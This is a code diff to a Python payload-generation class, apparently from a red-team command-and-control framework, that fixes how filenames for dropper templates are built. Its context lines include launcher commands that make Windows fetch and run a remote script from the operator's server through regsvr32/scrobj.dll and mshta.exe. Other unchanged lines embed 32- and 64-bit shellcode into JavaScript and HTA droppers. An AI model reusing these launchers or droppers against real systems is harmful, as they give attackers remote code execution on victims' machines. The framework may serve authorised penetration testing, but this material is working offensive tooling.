@@ -294,7 +294,7 @@ class Payloads(object):
     def CreateSCT(self, name=""):
         self.QuickstartLog(Colours.END)
         self.QuickstartLog("regsvr32 /s /n /u /i:%s scrobj.dll" % f"{self.FirstURL}/{self.QuickCommand}_rg")
-        with open("%s%sdropper_rg.sct" % (PayloadTemplatesDirectory, name), 'r') as f:
+        with open("%sdropper_rg.sct" % (PayloadTemplatesDirectory), 'r') as f:
             content = f.read()
         content = str(content) \
             .replace("#REPLACEME#", self.CreateRawBase())
@@ -303,7 +303,7 @@ class Payloads(object):
 
         self.QuickstartLog(Colours.END)
         self.QuickstartLog("mshta.exe vbscript:GetObject(\"script:%s\")(window.close)" % f"{self.FirstURL}/{self.QuickCommand}_cs")
-        with open("%s%sdropper_cs.sct" % (PayloadTemplatesDirectory, name), 'r') as f:
+        with open("%sdropper_cs.sct" % (PayloadTemplatesDirectory), 'r') as f:
             content = f.read()
         content = str(content) \
             .replace("#REPLACEME#", self.CreateRawBase())
@@ -315,7 +315,7 @@ class Payloads(object):
         self.QuickstartLog("HTA Payload written to: %sLauncher.hta" % self.BaseDirectory)
 
         basefile = self.CreateRawBase(full=True)
-        with open("%s%sdropper.hta" % (PayloadTemplatesDirectory, name), 'r') as f:
+        with open("%sdropper.hta" % (PayloadTemplatesDirectory), 'r') as f:
             hta = f.read()
         hta = str(hta) \
             .replace("#REPLACEME#", basefile)
@@ -331,6 +331,7 @@ class Payloads(object):
 
     def CreateDotNet2JSFiles(self, payloadtype, name=""):
         self.QuickstartLog("Payload written to: %s%s%s_DotNet2JS.js" % (self.BaseDirectory, name, payloadtype.value))
+        self.QuickstartLog("Payload written to: %s%s%s_DotNet2JS.b64" % (self.BaseDirectory, name, payloadtype.value))
         with open("%sDotNet2JS.js" % PayloadTemplatesDirectory, 'r') as f:
             dotnet = f.read()
 
@@ -343,11 +344,11 @@ class Payloads(object):
             .replace("#REPLACEME32#", shellcode32.decode('utf-8'))  \
             .replace("#REPLACEME64#", shellcode64.decode('utf-8'))
 
-        filename = "%s%s%s_DotNet2JS.js" % (self.BaseDirectory, payloadtype.value, name)
+        filename = "%s%s%s_DotNet2JS.js" % (self.BaseDirectory, name, payloadtype.value)
         with open(filename, 'w') as f:
             f.write(dotnet)
 
-        filename = "%s%s%s_DotNet2JS.b64" % (self.BaseDirectory, payloadtype.value, name)
+        filename = "%s%s%s_DotNet2JS.b64" % (self.BaseDirectory, name, payloadtype.value)
         with open(filename, 'w') as f:
             f.write(base64.b64encode(dotnet.encode('UTF-8')).decode('utf-8'))
 
